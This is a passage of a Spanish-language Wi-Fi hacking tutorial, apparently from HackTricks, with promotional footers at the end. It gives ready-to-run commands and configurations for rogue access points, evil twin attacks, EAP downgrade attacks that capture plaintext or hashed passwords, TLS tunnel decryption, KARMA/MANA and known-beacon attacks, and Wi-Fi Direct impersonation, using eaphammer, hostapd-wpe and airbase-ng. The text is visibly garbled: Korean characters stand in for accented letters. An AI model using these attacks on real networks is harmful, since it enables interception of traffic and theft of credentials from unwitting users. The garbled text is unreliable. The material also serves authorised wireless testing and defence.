Aunque el protocolo 802.11 tiene reglas muy espec칤ficas que dictan c칩mo una estaci칩n puede unirse a un ESS, no especifica c칩mo la estaci칩n debe seleccionar un ESS al que conectarse. Adem치s, el protocolo permite a las estaciones moverse libremente entre puntos de acceso que comparten el mismo ESSID (porque no querr칤as perder la conectividad WiFi al caminar de un extremo de un edificio a otro, etc). Sin embargo, el protocolo 802.11 no especifica c칩mo se deben seleccionar estos puntos de acceso. Adem치s, aunque las estaciones deben autenticarse en el ESS para asociarse con un punto de acceso, el protocolo 802.11 no requiere que el punto de acceso se autentique en la estaci칩n.

### Listas de Redes Preferidas (PNL)

Cada vez que una estaci칩n se conecta a una red inal치mbrica, el ESSID de la red se almacena en la Lista de Redes Preferidas (PNL) de la estaci칩n. La PNL es una lista ordenada de cada red a la que la estaci칩n se ha conectado en el pasado, y cada entrada en la PNL contiene el ESSID de la red y cualquier informaci칩n de configuraci칩n espec칤fica de la red necesaria para establecer una conexi칩n.

### Escaneo Pasivo

En redes de infraestructura, los puntos de acceso transmiten peri칩dicamente tramas de balizas para anunciar su presencia y capacidades a las estaciones cercanas. Las balizas son tramas de difusi칩n, lo que significa que est치n destinadas a ser recibidas por todas las estaciones cercanas en rango. Las balizas incluyen informaci칩n sobre las tasas admitidas por el AP, las capacidades de cifrado, informaci칩n adicional y, lo m치s importante, las balizas contienen el ESSID del AP (si la difusi칩n de ESSID no est치 desactivada).

Durante el escaneo pasivo, el dispositivo cliente escucha las tramas de balizas de los puntos de acceso cercanos. Si el dispositivo cliente recibe una trama de baliza cuyo campo ESSID coincide con un ESSID de la PNL del cliente, el cliente se conectar치 autom치ticamente al punto de acceso que envi칩 la trama de baliza. Entonces, supongamos que queremos atacar un dispositivo inal치mbrico que no est치 conectado actualmente a ninguna red inal치mbrica. Si conocemos al menos una entrada en la PNL de ese cliente, podemos forzar al cliente a conectarse a nosotros simplemente creando nuestro propio punto de acceso con el ESSID de esa entrada.

### Sondeo Activo

El segundo algoritmo de selecci칩n de red utilizado en 802.11 se conoce como Sondeo Activo. Los dispositivos clientes que utilizan el sondeo activo transmiten continuamente tramas de solicitud de sondeo para determinar qu칠 AP est치n dentro del rango, as칤 como cu치les son sus capacidades. Las solicitudes de sondeo vienen en dos formas: dirigidas y de difusi칩n. Las solicitudes de sondeo dirigidas est치n dirigidas a un ESSID espec칤fico, y son la forma en que el cliente comprueba si una red espec칤fica est치 cerca.

Los clientes que utilizan el sondeo dirigido enviar치n solicitudes de sondeo para cada red en su PNL. Cabe destacar que el sondeo dirigido es la 칰nica forma de identificar la presencia de redes ocultas cercanas. Las solicitudes de sondeo de difusi칩n funcionan casi exactamente de la misma manera, pero se env칤an con el campo SSID configurado en NULL. Esto dirige la solicitud de sondeo a todos los puntos de acceso cercanos, permitiendo a la estaci칩n verificar si alguna de sus redes preferidas est치 cerca sin revelar el contenido de su PNL.

## AP simple con redirecci칩n a Internet

Antes de explicar c칩mo realizar ataques m치s complejos, se va a explicar **c칩mo** simplemente **crear** un **AP** y **redirigir** su **tr치fico** a una interfaz conectada **a** **Internet**.

Usando `ifconfig -a`, verifica que la interfaz wlan para crear el AP y la interfaz conectada a Internet est칠n presentes.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Crear un archivo de configuraci칩n _/etc/dnsmasq.conf_ de la siguiente manera:
```
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Luego **configura las IPs** y las **rutas**:
```
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Y luego **inicie** dnsmasq:
```
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```
apt-get install hostapd
```
Crear un archivo de configuraci칩n _hostapd.conf:_
```
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Detener procesos molestos**, establecer **modo monitor** y **iniciar hostapd**:
```
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Reenv칤o y Redirecci칩n
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Un ataque de evil twin es un tipo de ataque Wi-Fi que aprovecha el hecho de que la mayor칤a de las computadoras y tel칠fonos solo ver치n el "nombre" o ESSID de una red inal치mbrica (ya que la estaci칩n base no necesita autenticarse contra el cliente). Esto hace que sea muy dif칤cil distinguir entre redes con el mismo nombre y el mismo tipo de cifrado. De hecho, muchas redes tendr치n varios puntos de acceso que extienden la red, todos usando el mismo nombre para ampliar el acceso sin confundir a los usuarios.

Debido a c칩mo funcionan los clientes (recuerda que el protocolo 802.11 permite a las estaciones moverse libremente entre puntos de acceso dentro del mismo ESS), es posible hacer que un dispositivo cambie la estaci칩n base a la que est치 conectado. Esto se puede lograr ofreciendo una mejor se침al (lo cual no siempre es posible) o bloqueando el acceso a la estaci칩n base original (paquetes de desautenticaci칩n, interferencia, u otra forma de ataque de denegaci칩n de servicio).

Tambi칠n ten en cuenta que las implementaciones inal치mbricas del mundo real suelen tener m치s de un solo punto de acceso, y estos puntos de acceso suelen ser m치s potentes y tener un mejor alcance visual directo debido a su ubicaci칩n hacia el techo. Desautenticar un solo punto de acceso generalmente resulta en que el objetivo se desplace hacia otro punto de acceso v치lido en lugar de tu AP falso, a menos que se desautentiquen todos los puntos de acceso cercanos (ruidoso) o seas muy cuidadoso con la ubicaci칩n del AP falso (dif칤cil).

Puedes crear un Evil Twin Abierto muy b치sico (sin capacidades para enrutar tr치fico a Internet) haciendo:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Tambi칠n puedes crear un Evil Twin usando **eaphammer** (ten en cuenta que para crear evil twins con eaphammer la interfaz **NO debe estar** en modo **monitor**):
```
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
O utilizando Airgeddon: `Opciones: 5,6,7,8,9 (dentro del men칰 de ataque Evil Twin).`

![](<../../.gitbook/assets/image (148).png>)

Por favor, ten en cuenta que por defecto, si un ESSID en la PNL est치 guardado como protegido con WPA, el dispositivo no se conectar치 autom치ticamente a un Evil Twin abierto. Puedes intentar hacer un DoS al AP real y esperar a que el usuario se conecte manualmente a tu Evil Twin abierto, o podr칤as hacer un DoS al AP real y usar un Evil Twin con WPA para capturar el handshake (usando este m칠todo no podr치s dejar que la v칤ctima se conecte a ti ya que no conoces la PSK, pero puedes capturar el handshake e intentar crackearlo).

_Algunos sistemas operativos y antivirus advertir치n al usuario que conectarse a una red abierta es peligroso..._

### Evil Twin WPA/WPA2

Puedes crear un **Evil Twin utilizando WPA/2** y si los dispositivos est치n configurados para conectarse a ese SSID con WPA/2, intentar치n conectarse. De todas formas, **para completar el handshake de 4 v칤as** tambi칠n necesitas **saber** la **contrase침a** que el cliente va a utilizar. Si **no la conoces**, la **conexi칩n no se completar치**.
```
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Evil Twin Empresarial

Para comprender estos ataques, recomendar칤a leer antes la breve [explicaci칩n de WPA Enterprise](./#wpa-enterprise-mgt).

**Usando hostapd-wpe**

`hostapd-wpe` necesita un archivo de **configuraci칩n** para funcionar. Para **automatizar** la generaci칩n de estas configuraciones, puedes utilizar [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) (descarga el archivo python dentro de _/etc/hostapd-wpe/_).
```
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
En el archivo de configuraci칩n puedes seleccionar muchas cosas diferentes como ssid, canal, archivos de usuario, cret/key, par치metros dh, versi칩n de wpa y autenticaci칩n...

[**Usando hostapd-wpe con EAP-TLS para permitir que cualquier certificado inicie sesi칩n.**](evil-twin-eap-tls.md)

**Usando EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Por defecto, EAPHammer utiliza estos m칠todos de autenticaci칩n (nota GTC como el primero en intentar obtener contrase침as en texto plano y luego el uso de m칠todos de autenticaci칩n m치s robustos):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Este es el m칠todo predeterminado para evitar tiempos de conexi칩n largos. Sin embargo, tambi칠n puedes especificar al servidor los m칠todos de autenticaci칩n de m치s d칠biles a m치s fuertes:
```
--negotiate weakest
```
O tambi칠n puedes usar:

* `--negotiate gtc-downgrade` para utilizar una implementaci칩n altamente eficiente de degradaci칩n GTC (contrase침as en texto plano)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` para especificar manualmente los m칠todos ofrecidos (ofrecer los mismos m칠todos de autenticaci칩n en el mismo orden que la organizaci칩n har치 que el ataque sea mucho m치s dif칤cil de detectar).
* [Encuentra m치s informaci칩n en el wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Usando Airgeddon**

`Airgeddon` puede utilizar certificados generados previamente para ofrecer autenticaci칩n EAP a redes WPA/WPA2-Enterprise. La red falsa degradar치 el protocolo de conexi칩n a EAP-MD5 para poder **capturar al usuario y el MD5 de la contrase침a**. Posteriormente, el atacante puede intentar descifrar la contrase침a.\
`Airggedon` te ofrece la posibilidad de un ataque de Evil Twin **continuo (ruidoso)** o **solo crear el ataque de Evil Twin hasta que alguien se conecte (discreto).**

![](<../../.gitbook/assets/image (129).png>)

### Depuraci칩n de t칰neles TLS PEAP y EAP-TTLS en ataques de Evil Twins

_Este m칠todo fue probado en una conexi칩n PEAP pero como estoy descifrando un t칰nel TLS arbitrario, esto tambi칠n deber칤a funcionar con EAP-TTLS_

Dentro de la **configuraci칩n** de _hostapd-wpe_ **comenta** la l칤nea que contiene _**dh\_file**_ (de `dh_file=/etc/hostapd-wpe/certs/dh` a `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Esto har치 que `hostapd-wpe` **intercambie claves usando RSA** en lugar de DH, por lo que podr치s **descifrar** el tr치fico m치s tarde **conociendo la clave privada del servidor**.

Ahora inicia el **Evil Twin** usando **`hostapd-wpe`** con esa configuraci칩n modificada como de costumbre. Adem치s, inicia **`wireshark`** en la **interfaz** que est치 realizando el ataque de Evil Twin.

Ahora o m치s tarde (cuando ya hayas capturado algunos intentos de autenticaci칩n) puedes agregar la clave privada RSA a wireshark en: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Agrega una nueva entrada y completa el formulario con estos valores: **Direcci칩n IP = cualquier** -- **Puerto = 0** -- **Protocolo = datos** -- **Archivo de clave** (**selecciona tu archivo de clave**, para evitar problemas selecciona un archivo de clave **sin protecci칩n con contrase침a**).

![](<../../.gitbook/assets/image (151).png>)

Y observa la nueva pesta침a **"TLS descifrado"**:

![](<../../.gitbook/assets/image (152).png>)

## Ataque KARMA, MANA, MANA ruidoso y Beacons conocidos

### Listas negras/blancas de ESSID y MAC

La siguiente tabla enumera los diferentes tipos de MFACLs (Listas de Control de Acceso a Tramas de Gesti칩n) disponibles, as칤 como sus efectos cuando se utilizan:

![](<../../.gitbook/assets/image (149).png>)
```
# example EAPHammer MFACL file, wildcards can be used
78:f0:97:fc:b5:36
9a:35:e1:01:4f:cf
69:19:14:60:20:45
ce:52:b8:*:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```
# example ESSID-based MFACL file
apples
oranges
grapes
pears

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Los ataques Karma son una segunda forma de ataque de punto de acceso falso que explota el proceso de selecci칩n de red utilizado por las estaciones. En un documento t칠cnico escrito en 2005 por Dino Dai Zovi y Shane Macaulay se describe c칩mo un atacante puede configurar un punto de acceso para escuchar solicitudes de sonda dirigidas y responder a todas ellas con respuestas de sonda dirigidas coincidentes. Esto hace que las estaciones afectadas env칤en autom치ticamente una solicitud de asociaci칩n al punto de acceso del atacante. El punto de acceso luego responde con una respuesta de asociaci칩n, lo que hace que las estaciones afectadas se conecten al atacante.

### MANA

Seg칰n Ian de Villiers y Dominic White, las estaciones modernas est치n dise침adas para protegerse contra los ataques Karma al ignorar las respuestas de sonda dirigidas de los puntos de acceso que a칰n no han respondido al menos a una solicitud de sonda de difusi칩n. Esto llev칩 a una disminuci칩n significativa en el n칰mero de estaciones vulnerables a los ataques Karma hasta 2015, cuando White y de Villiers desarrollaron un medio para eludir tales protecciones. En el ataque Karma mejorado de White y de Villiers (ataque MANA), las respuestas de sonda dirigidas se utilizan para reconstruir las PNL de las estaciones cercanas. Cuando se recibe una solicitud de sonda de difusi칩n de una estaci칩n, el punto de acceso del atacante responde con un SSID arbitrario de la PNL de la estaci칩n que ya se vio en una sonda directa desde ese dispositivo.

En resumen, el algoritmo MANA funciona de la siguiente manera: cada vez que el punto de acceso recibe una solicitud de sonda, primero determina si es una sonda de difusi칩n o dirigida. Si es una sonda dirigida, la direcci칩n MAC del remitente se agrega a la tabla hash (si a칰n no est치 all칤) y el ESSID se agrega a la PNL de ese dispositivo. El punto de acceso responde luego con una respuesta de sonda dirigida. Si es una sonda de difusi칩n, el punto de acceso responde con respuestas de sonda para cada una de las redes en la PNL de ese dispositivo.

Ataque MANA utilizando eaphammer:
```
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Ataque Loud MANA

Observa que el ataque MANA est치ndar todav칤a no nos permite atacar dispositivos que no utilizan sondeos dirigidos en absoluto. Por lo tanto, si tampoco conocemos previamente ninguna entrada dentro del PNL del dispositivo, necesitamos encontrar alguna otra forma de atacarlo.

Una posibilidad es lo que se llama ataque Loud MANA. Este ataque se basa en la idea de que los dispositivos clientes en proximidad f칤sica cercana entre s칤 probablemente tengan al menos algunas entradas comunes en sus PNL.

En resumen, en el ataque Loud MANA en lugar de responder a las solicitudes de sondeo con cada ESSID en el PNL de un dispositivo en particular, el AP falso env칤a respuestas de sondeo para cada ESSID en cada PNL de todos los dispositivos que ha visto antes. Relacionando esto con la teor칤a de conjuntos, podemos decir que el AP env칤a respuestas de sondeo para cada ESSID en la uni칩n de todos los PNL de los dispositivos cercanos.
```
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Ataque de Beacon conocido

Todav칤a hay casos en los que el ataque Loud MANA no tendr치 칠xito.\
El ataque de Beacon conocido es una forma de "fuerza bruta" de ESSIDs para intentar que la v칤ctima se conecte al atacante. El atacante crea un AP que responde a cualquier ESSID y ejecuta alg칰n c칩digo enviando beacons falsificando ESSIDs de cada nombre dentro de una lista de palabras. Con suerte, la v칤ctima contendr치 algunos de estos nombres de ESSID dentro de su PNL y tratar치 de conectarse al AP falso.\
Eaphammer implement칩 este ataque como un ataque MANA donde todos los ESSIDs dentro de una lista son cargados (tambi칠n puedes combinar esto con `--loud` para crear un ataque Loud MANA + Beacon conocido):
```
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Ataque de r치faga de balizas conocidas**

Dado que las balizas conocidas son ruidosas, puedes utilizar un script dentro del proyecto Eaphammer para lanzar r치fagas de balizas de cada nombre de ESSID dentro de un archivo de manera muy r치pida. Si combinas este script con un ataque MANA de Eaphammer, los clientes podr치n conectarse a tu punto de acceso.
```
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

Wi-Fi Direct es un est치ndar de Wi-Fi que permite que los dispositivos se conecten entre s칤 sin un punto de acceso inal치mbrico, ya que uno de los dos dispositivos actuar치 como AP (llamado propietario del grupo). Puedes encontrar Wi-Fi Direct en muchos dispositivos de IoT como impresoras, televisores...

Wi-Fi Direct se basa en Wi-Fi Protected Setup (**WPS**) para conectar de forma segura los dispositivos. WPS tiene m칰ltiples m칠todos de configuraci칩n como la Configuraci칩n de **Bot칩n de Pulsaci칩n** (PBC), la **entrada de PIN**, y la **Comunicaci칩n de Campo Cercano** (NFC).

Por lo tanto, los ataques previamente vistos al PIN de WPS tambi칠n son v치lidos aqu칤 si se utiliza el PIN.

### Secuestro de EvilDirect

Esto funciona como un Evil-Twin pero para Wi-Fi Direct, puedes hacer pasar por propietario de grupo para intentar que otros dispositivos como tel칠fonos se conecten a ti: `airbase-ng -c 6 -e DIRECT-5x-BRAVIA -a BB:BB:BB:BB:BB:BB mon0`

## Referencias

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)

TODO: Echa un vistazo a [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (inicio de sesi칩n con Facebook e imitaci칩n de WPA en portales cautivos)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

칔nete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de bugs!

**Perspectivas de Hacking**\
Invol칰crate con contenido que explora la emoci칩n y los desaf칤os del hacking

**Noticias de Hacking en Tiempo Real**\
Mantente actualizado con el mundo del hacking a trav칠s de noticias e informaci칩n en tiempo real

**칔ltimos Anuncios**\
Mantente informado sobre los nuevos programas de recompensas por errores que se lanzan y las actualizaciones importantes de la plataforma

**칔nete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) 춰y comienza a colaborar con los mejores hackers hoy!

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 춰Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
